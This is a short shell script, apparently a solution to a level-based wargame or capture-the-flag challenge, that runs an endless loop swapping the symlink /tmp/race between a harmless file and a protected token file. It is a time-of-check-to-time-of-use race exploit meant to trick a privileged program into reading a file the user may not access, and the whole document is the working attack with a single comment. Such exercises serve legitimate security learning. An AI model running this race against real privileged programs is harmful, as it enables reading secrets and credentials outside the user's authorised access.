# Switch link with access to link without access

while true; do
    ln -sf /tmp/fake /tmp/race
    ln -sf /home/user/level10/token /tmp/race
done